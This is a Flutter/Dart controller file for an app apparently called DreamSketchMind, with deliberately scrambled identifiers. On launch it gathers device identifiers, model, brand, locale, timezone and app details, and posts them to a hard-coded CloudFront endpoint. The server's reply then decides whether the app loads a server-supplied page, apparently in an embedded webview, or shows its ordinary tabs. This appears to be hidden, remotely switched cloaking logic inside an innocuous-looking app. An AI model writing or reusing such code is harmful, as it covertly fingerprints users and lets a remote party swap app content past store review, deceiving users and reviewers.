import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DreamSketchMindLogic extends GetxController {

  var xseyqndgmv = RxBool(false);
  var sygiubjca = RxBool(true);
  var rmidzhf = RxString("");
  var edxwuk = RxBool(false);
  var acrbwvux = RxBool(true);
  final yjxgkztrsh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    aqle();
  }


  Future<void> aqle() async {
    edxwuk.value = true;
    acrbwvux.value = true;
    sygiubjca.value = false;

    yjxgkztrsh.post("https://d1htnryofazg60.cloudfront.net/qHbplY0F7D0y6",data: await jcrybzo()).then((value) {
      var bvfgwm = value.data["bvfgwm"] as String;
      var hsoved = value.data["hsoved"] as bool;
      if (hsoved) {
        rmidzhf.value = bvfgwm;
        yijdphq();
      } else {
        qynat();
      }
    }).catchError((e) {
      sygiubjca.value = true;
      acrbwvux.value = true;
      edxwuk.value = false;
    });
  }

  Future<Map<String, dynamic>> jcrybzo() async {
    final DeviceInfoPlugin rsfu = DeviceInfoPlugin();
    PackageInfo sovg_xlrbgfp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cahkt = Platform.localeName;
    var KlSQg = currentTimeZone;

    var NlzEcd = sovg_xlrbgfp.packageName;
    var VcvpPrb = sovg_xlrbgfp.version;
    var mjNvz = sovg_xlrbgfp.buildNumber;

    var sUImRAg = sovg_xlrbgfp.appName;
    var pXyGZH = "";
    var OgiXw  = "";
    var qLmQ = "";
    var bajqowd = "";
    var voriqkhf = "";
    var erawgc = "";
    var dkjiq = "";
    var dzojrbc = "";
    var incu = "";
    var islzx = "";


    var vzAueKcD = "";
    var QyaOKsNL = false;

    if (GetPlatform.isAndroid) {
      vzAueKcD = "android";
      var hgjxrwd = await rsfu.androidInfo;

      qLmQ = hgjxrwd.brand;

      pXyGZH  = hgjxrwd.model;
      OgiXw = hgjxrwd.id;

      QyaOKsNL = hgjxrwd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vzAueKcD = "ios";
      var hzctvafq = await rsfu.iosInfo;
      qLmQ = hzctvafq.name;
      pXyGZH = hzctvafq.model;

      OgiXw = hzctvafq.identifierForVendor ?? "";
      QyaOKsNL  = hzctvafq.isPhysicalDevice;
    }
    var res = {
      "sUImRAg": sUImRAg,
      "VcvpPrb": VcvpPrb,
      "NlzEcd": NlzEcd,
      "voriqkhf" : voriqkhf,
      "pXyGZH": pXyGZH,
      "KlSQg": KlSQg,
      "erawgc" : erawgc,
      "qLmQ": qLmQ,
      "OgiXw": OgiXw,
      "cahkt": cahkt,
      "vzAueKcD": vzAueKcD,
      "QyaOKsNL": QyaOKsNL,
      "bajqowd" : bajqowd,
      "dkjiq" : dkjiq,
      "mjNvz": mjNvz,
      "dzojrbc" : dzojrbc,
      "incu" : incu,
      "islzx" : islzx,

    };
    return res;
  }

  Future<void> qynat() async {
    Get.offNamed("/tab");
  }

  Future<void> yijdphq() async {
    Get.offNamed("/home-point");
  }

}
